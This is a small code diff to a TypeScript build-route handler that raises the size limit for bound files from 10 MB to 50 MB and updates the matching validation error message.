@@ -234,7 +234,7 @@ export async function handleBuildRoutes(
           ? sleepSeconds : 0;
 
       const MAX_BOUND_FILES = 5;
-      const MAX_BOUND_FILE_BYTES = 10 * 1024 * 1024;
+      const MAX_BOUND_FILE_BYTES = 50 * 1024 * 1024;
       const ALLOWED_BIND_TARGET_OS = new Set(["windows", "linux", "darwin"]);
       const RESERVED_BIND_NAMES = new Set(["manifest.json"]);
       type SafeBoundFile = { name: string; data: string; targetOS: string[]; execute: boolean };
@@ -266,7 +266,7 @@ export async function handleBuildRoutes(
           }
           const approxDecodedBytes = Math.floor(f.data.length * 3 / 4);
           if (approxDecodedBytes > MAX_BOUND_FILE_BYTES) {
-            return Response.json({ error: `Bound file '${safeName}' exceeds the 10 MB limit` }, { status: 400 });
+            return Response.json({ error: `Bound file '${safeName}' exceeds the 50 MB limit` }, { status: 400 });
           }
           const safeTargetOS = Array.isArray(f.targetOS)
             ? f.targetOS.filter((o: unknown) => typeof o === "string" && ALLOWED_BIND_TARGET_OS.has(o as string)) as string[]
